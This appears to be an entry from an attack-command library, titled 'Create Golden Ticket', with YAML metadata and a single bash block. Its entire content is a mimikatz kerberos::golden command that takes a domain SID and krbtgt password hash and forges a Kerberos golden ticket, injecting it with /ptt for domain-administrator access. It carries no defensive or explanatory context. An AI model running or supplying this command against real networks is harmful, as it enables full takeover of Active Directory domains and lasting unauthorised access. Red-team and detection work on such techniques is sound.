---
id: 3c90d5d3-3f6c-4348-8e70-4f55eb77d78c
name: Create Golden Ticket
type: command
executor: bash
data: .\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID
  /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
output: null
created_at: '2023-04-06T03:56:27.267616+00:00'
updated_at: '2023-04-10T20:37:17.682651+00:00'
---

# Create Golden Ticket

```bash
.\mimikatz kerberos::golden /admin:ADMINACCOUNTNAME /domain:DOMAINFQDN /id:ACCOUNTRID /sid:DOMAINSID /krbtgt:KRBTGTPASSWORDHASH /ptt
```
